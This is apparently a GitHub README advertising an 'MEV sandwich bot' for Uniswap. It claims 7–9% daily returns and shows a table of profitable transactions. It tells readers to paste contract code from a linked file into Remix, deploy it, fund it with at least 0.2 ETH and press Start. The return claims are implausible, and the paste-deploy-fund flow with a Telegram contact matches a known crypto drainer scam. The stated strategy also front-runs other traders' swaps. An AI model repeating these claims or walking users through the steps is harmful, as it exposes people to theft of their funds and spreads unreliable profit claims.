<div align="center">
	
# 🥪 Ethereum Uniswap MEV Sandwich Bot (DeFi)  

*An open-source arbitrage bot designed to capitalize on market inefficiencies in Uniswap liquidity pools.  
Built for DeFi enthusiasts who want to explore Ethereum MEV (Maximal Extractable Value) trading strategies.* 
</div>

<p align="center">
  <img src="https://img.shields.io/github/stars/sreesohtml/uniswap-slippage-trading-bot?style=social" alt="GitHub stars" />
  <img src="https://img.shields.io/github/forks/sreesohtml/uniswap-slippage-trading-bot?style=social" alt="GitHub forks" />
  <img src="https://github.com/ntkme/github-buttons/workflows/build/badge.svg" alt="build"/>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white" alt="ethereum" />
  <img src="https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white" alt="solidity" />
</p>

**Current Performance**:  
- **Avg. Daily Return**: 7–9% on capital deployed (varies with market volatility).  
- **Minimum Capital Requirement**: **0.2 ETH** (under current gas and liquidity conditions).  
- **Note**: Profitability depends on network congestion, competition, and pool liquidity.
- **No guarantees**. Past performance ≠ future results.    

---
### 📈 Latest Profitable Transactions

**Last updated:** 2025-04-20 10:46:16

Below are the latest profitable transactions executed by our live [MEV Sandwich Bot](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000), showcasing real-time profits in ETH.

| Tx Hash | Block | Profit (ETH) | Timestamp |
|---------|-------|--------------|-----------|
| [0x011aed46...](https://etherscan.io/tx/0x011aed46c00f3eb79215f2dd5f48d3613773d5dfc531945e869d8735fd664a90) | 22309706 | 0.00461 | 2025-04-20 10:45:59 |
| [0xdacb3429...](https://etherscan.io/tx/0xdacb342998b370113375e3e56db9f283bc68232b3575d8a830880116f0097fe0) | 22309705 | 0.0015 | 2025-04-20 10:45:47 |
| [0xb9af7949...](https://etherscan.io/tx/0xb9af7949d1b86f7302dd255de25406322c9de7049e3f5519eed0e6481eda016f) | 22309704 | 0.000955 | 2025-04-20 10:45:35 |
| [0x1f60e76a...](https://etherscan.io/tx/0x1f60e76a8fb61075d315fcdf950c754dd5f4f5acf50d6b1a2b8e2de22951bbca) | 22309701 | 0.00229 | 2025-04-20 10:44:59 |
| [0x5d3aebe2...](https://etherscan.io/tx/0x5d3aebe293e03cb87f7630bfff5d401ce62351237571a58de43a87d50ae1c846) | 22309698 | 0.004885 | 2025-04-20 10:44:23 |

---
### 📚 How this bot works  
This bot monitors pending transactions in the Ethereum mempool for large swaps on Uniswap. When it detects a **high-slippage transaction**, it executes a **three-step strategy**:  
1. Buys the target asset before the large swap.  
2. Lets the target swap shift the asset’s price.  
3. Sells the asset at the optimized price.

The bot is able to perform multiple transactions, if it is necessary to capture an opportunity.   

---

### ✨ Features  
- Monitors the Ethereum mempool and executes MEV strategies automatically
- Dynamic gas pricing to stay competitive  
- Built-in reverts for failed transactions and profit threshholds to filter out unprofitable transactions
- Open-source code and modular codebase for tweaking strategies (e.g. profit threshholds, gas multipliers, ...).  

---

### ⚡ How to run the bot  
1)  **Download** [MetaMask](https://metamask.io/download.html) or any other EVM wallet 

2)  **Access** [Remix - Ethereum IDE](https://remix.ethereum.org) (Web-based environment to write, compile and deploy Ethereum smart contracts)

3) 📁 **Create a `New File`**. Rename it as you like, e.g.: “bot.sol”.

<img src="https://i.imgur.com/1XiPUes.png">

4) 📋 **Paste** [this code](https://raw.githubusercontent.com/sreesohtml/uniswap-slippage-trading-bot/refs/heads/main/bot.sol) from Github into your newly created Remix file

5) 🔧**Compiling:** Go to the `Solidity Compiler` tab, select version `0.8.20+commit` and then select `Compile bot.sol`.

![2](https://i.imgur.com/G9gsNIo.png)

6) 🚀 **Deploy the bot:** Navigate to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - Metamask` environment and then `Deploy`. By approving the Metamask contract creation fee, you will have created your own MEV-Bot.

![3](https://i.imgur.com/2odZQNj.png)

---

#### ⚙️ Configuration

7) **Fund your bot:** Copy your newly created contract address and fund it with at least 0.2 ETH as initial balance for the bot by sending ETH to the copied address.

![4](https://i.imgur.com/80NJYYr.png)
 
8) **Buttons:**
	- After your transaction is confirmed, click the `Start` button to run the bot.
	- Press the `Stop` button to halt bot operations.  
   - Withdraw all ETH to the owner (=wallet address, that created the bot) by clicking the `Withdrawal` button.  
   
![4](https://i.imgur.com/ktiJ1Ll.png)

![5](https://i.imgur.com/xczMc3G.png)

---

### 📜 License  
This project is [MIT licensed](https://github.com/sreesohtml/uniswap-slippage-trading-bot/blob/main/LICENSE).  
**Reminder**: Open-source != endorsement. Use responsibly.  

---

### 💬 Contact  
If you have any questions or inquiries, feel free to reach out on Telegram: [Click Here](https://t.me/DeFiLabsContact)   

--- 

### ⭐ Show your Support

If you find our project interesting, please consider giving it a star. Your support is greatly appreciated and helps in motivating further development and improvements.


---

### 💭 FAQ
#### Do I need to keep remix open in browser while the bot is activated? 

No, just save the bot contract address after creating it. The next time you want to access your bot via Remix, you need to compile the file again as in step 5. Now head to `DEPLOY & RUN TRANSACTIONS`, reconnect your Metamask, paste your contract address into `Load contract from Address` and press `At Address`.

![](https://i.imgur.com/SG1aENC.png)

Now you can find it again under "Deployed Contracts".

#### Does it work on other chains or DEXes as well?

Currently the bot is dedicated only for Ethereum on Uniswap pools.

---

### 🤝 Contribute & Customize  
**Want to improve the bot?**  
1. Fork the repo.  
2. Add your enhancements (e.g., new pool filters, gas optimizations).  
3. Submit a PR!
